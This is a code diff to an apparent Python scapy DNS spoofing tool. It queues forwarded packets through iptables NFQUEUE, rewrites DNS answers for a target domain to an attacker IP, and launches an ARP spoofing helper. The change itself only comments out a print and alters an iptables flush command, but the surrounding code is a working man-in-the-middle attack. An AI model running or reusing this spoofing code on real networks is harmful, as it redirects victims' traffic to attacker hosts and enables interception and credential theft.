@@ -12,7 +12,7 @@ def process_packets(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.DNSRR):
         qname = scapy_packet[scapy.DNSQR].qname
-        print(qname)
+        #print(qname)
         if target_name in qname:
             print("Spoofing......")
             spoof = scapy.DNSRR(rrname=qname, rdata=attacker_ip)
@@ -30,7 +30,7 @@ def process_packets(packet):
 def arp_spoofing():
     Popen(['./arp_spoofing'])
 
-os.system("iptables --flush")
+os.system("iptables -t nat -F")
 #os.system("iptables -I OUTPUT -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
 #os.system("iptables -I INPUT -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
 os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
